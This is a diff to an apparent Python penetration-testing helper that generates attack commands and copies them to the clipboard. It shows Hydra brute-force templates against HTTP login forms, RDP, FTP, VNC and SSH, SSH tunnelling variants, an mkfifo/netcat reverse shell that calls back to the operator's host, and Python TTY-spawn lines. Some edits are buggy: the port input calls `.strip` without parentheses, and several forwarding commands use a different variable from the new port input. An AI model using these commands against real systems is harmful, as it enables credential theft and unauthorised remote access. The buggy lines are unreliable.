@@ -20,7 +20,6 @@ target_ip = args.target
 store_directory = args.d
 
 """
-Implement clear screen, add impacket
 Eliminate the / at the end of directory
 """
 if store_directory[-1] == "/":
@@ -38,9 +37,15 @@ def clear():
         _ = system('clear') 
 
 def tools(listoftools):
+    n = 1
     for tool in sorted(listoftools):
-        print(tool, end=' / ')
-    print('\n')
+        print(tool, end=" | ")
+        if n == 11:
+            print('\n')
+            n = 1
+        n += 1
+    if n <= 11:
+        print('\n')
     print("-" * 70)
 
 def copy_to_clipboard(options):
@@ -97,6 +102,9 @@ def nmap():
     copy_to_clipboard(options)
 
 def hydra():
+    print("Please enter the path to the login form")
+    path = get_url()
+
     print("Please enter request from burp. Leave blank to use default")
     request = get_url()
 
@@ -109,11 +117,11 @@ def hydra():
     print("Please error message. Leave blank to use default")
     error = input("Input: ").strip()
 
-    options = {1 : ["hydra post request brutefroce", f'hydra -L {user_list} -P {pass_list} {target_ip} http-post-form "{request}:{error}" -V -I'],
-        1 : ["hydra rdp request brutefroce", f'hydra -t 2 -V -f -L {user_list} -I -P {pass_list} rdp://{target_ip}'],
-        2 : ["hydra ftp brutefroce", f'hydra -t 4 -V -L {user_list} -I -P {pass_list} ftp://{target_ip}'],
-        3 : ["hydra vnc brutefroce", f'hydra -L {user_list} -P {pass_list}  -t 1 -w 5 -f -s 5900 {target_ip} vnc -v'],
-        4 : ["hydra ssh brutefroce", f'hydra -L {user_list} -P {pass_list} {target_ip} ssh'],
+    options = {1 : ["hydra post request brutefroce", f'hydra -L {user_list} -P {pass_list} {target_ip} http-post-form "{path}:{request}:{error}" -V -I'],
+        2 : ["hydra rdp request brutefroce", f'hydra -t 2 -V -f -L {user_list} -I -P {pass_list} rdp://{target_ip}'],
+        3 : ["hydra ftp brutefroce", f'hydra -t 4 -V -L {user_list} -I -P {pass_list} ftp://{target_ip}'],
+        4 : ["hydra vnc brutefroce", f'hydra -L {user_list} -P {pass_list}  -t 1 -w 5 -f -s 5900 {target_ip} vnc -v'],
+        5 : ["hydra ssh brutefroce", f'hydra -L {user_list} -P {pass_list} {target_ip} ssh'],
     }
 
     copy_to_clipboard(options)
@@ -182,12 +190,15 @@ def rdesktop():
     copy_to_clipboard(options)
 
 def ssh():
-    user = input("Enter username: ").strip()
+    user = input("Enter username to connect to: ").strip()
+    port = input("Enter target port: ").strip
     options = {1 : ["Create a SSH connection", f"ssh {user}@{target_ip} -p 22"],
         2 : ["Dynamic port forwarding", f"ssh -ND 9050 {user}@{target_ip} -p 22"],
         3 : ["SSH with private key", f"ssh -i [key file] {user}@{target_ip}"],
-        4 : ["Local port forwarding", f"ssh -CNL 81:{source_ip}:80 {user}@{source_ip} -p 22"],
-        5 : ["Remote port forwarding", f"ssh -CNR 81:localhost:80 {user}@{target_ip} -p 22"],
+        4 : ["Local port forwarding", f"ssh -CNL 81:{source_ip}:{port} {user}@{source_ip} -p 22"],
+        5 : ["Local port forwarding", f"ssh -CNL 81:{target_ip}:{local_port} {user}@{target_ip} -p 22"],
+        6 : ["Remote port forwarding", f"ssh -CNR 81:localhost:{local_port} {user}@{target_ip} -p 22"],
+        7 : ["Remote port forwarding", f"ssh -CNR 81:localhost:{local_port} {user}@{source_ip} -p 22"],
     }
     
     copy_to_clipboard(options)
@@ -279,6 +290,8 @@ def shell():
         5 : ["Reverse shell with mkfifo", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {source_ip} {local_port} >/tmp/f"],
         6 : ["Reverse shell with xterm", f"xterm -display {source_ip}:1"],
         7 : ["Spawn tty shell with python", f"""python -c 'import pty; pty.spawn("/bin/bash")'"""],
+        8 : ["Spawn tty shell with python", f"""python3 -c 'import pty; pty.spawn("/bin/bash")'"""],
+        9 : ["Spawn tty shell with python", f"""import pty; pty.spawn("/bin/bash")"""],
     }
     
     copy_to_clipboard(options)
